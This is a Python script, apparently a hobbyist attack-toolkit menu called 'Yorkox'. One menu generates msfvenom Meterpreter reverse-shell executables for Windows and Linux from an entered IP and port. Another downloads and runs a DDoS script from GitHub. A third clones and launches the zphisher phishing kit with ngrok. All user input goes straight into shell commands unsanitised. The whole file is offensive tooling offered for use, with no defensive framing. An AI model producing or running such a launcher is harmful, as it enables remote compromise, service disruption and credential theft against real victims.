import os, time

#   <--Menu-->

print(chr(27)+"[1;31m"+"")
banner = """


    ██╗   ██╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗  ██╗
    ╚██╗ ██╔╝██╔═══██╗██╔══██╗██║ ██╔╝██╔═══██╗╚██╗██╔╝
     ╚████╔╝ ██║   ██║██████╔╝█████╔╝ ██║   ██║ ╚███╔╝
      ╚██╔╝  ██║   ██║██╔══██╗██╔═██╗ ██║   ██║ ██╔██╗
       ██║   ╚██████╔╝██║  ██║██║  ██╗╚██████╔╝██╔╝ ██╗
       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
"""

def decoracion():
    time.sleep(1)
    print(chr(27)+"[1;35m"+"              |                    1 -->> MsfVenom")
    time.sleep(1)
    print("              |                    2 -->> DDoS")
    time.sleep(1)
    print("              |                    3 -->> Phishing")
    time.sleep(1)
    print("              |                    4 -->> Exit")
    time.sleep(1)
    option = input("              ↳ ")
    
    if option == "1":
        msf()

    if option == "2":
        ddos()

    if option == "3":
        phishing()
    

    if option == "4":
        print("")
        print("Bye...")
        time.sleep(1)
        os.system("clear")
        exit()


def start_menu():
    os.system("clear")
    print(chr(27)+"[1;31m"+"")
    print(banner)
    decoracion()

def msf():
    os.system("clear")
    print(chr(27)+"[1;31m"+"")
    print(banner)
    print(chr(27)+"[1;35m"+"              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Exit")
    x = input("              ↳ ")
    
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > download.exe")
        print(chr(27)+"[1;31m"+"FileName == download.exe")
        time.sleep(3)
        while True:
            msf()
    
    if x == "2":
        print(chr(27)+"[1;32m"+"")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx86.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx86.elf")
        time.sleep(3)
        while True:
            msf()

    if x == "3":
        print(chr(27)+"[1;32m"+"")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx64.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx64.elf")
        time.sleep(3)
        while True:
            msf()

    if x == "4":
        start_menu()

def ddos():
    os.system("clear")
    print(chr(27)+"[1;31m"+"")
    print(banner)
    print(chr(27)+"[1;35m"+"              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        time.sleep(1)
        os.system("wget https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py")
        print(chr(27)+"[1;31m"+"Download Succesfull!!")
        time.sleep(2)
        while True:
            ddos()
    
    if x == "2":
        print("")
        print("Executting...")
        time.sleep(1)
        os.system("python3 ddos.py")

    if x == "3":
        start_menu()

def phishing():
    os.system("clear")

    print(chr(27)+"[1;31m"+"")
    print(banner)
    print(chr(27)+"[1;35m"+"              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        time.sleep(1)
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        print("Downloading Ngrok...")
        time.sleep(1)
        os.system("curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -o unzip.zip")
        os.system("unzip unzip.zip")
        os.system("rm unzip.zip")
        print("Done!!")
        time.sleep(1)
        while True:
            phishing()
    
    if x == "2":
        print("")
        print("Executting...")
        time.sleep(1)
        os.system("mv zphisher/.sites .")
        time.sleep(1)
        os.system("bash zphisher/zphisher.sh")

    if x == "3":
        start_menu()

print(chr(27)+"[1;36m"+"Created by Yorkox")
print(chr(27)+"[1;31m"+"")
if input("Continue? s/n --->> ") == "s":
    start_menu()
else:
    exit("Bye")
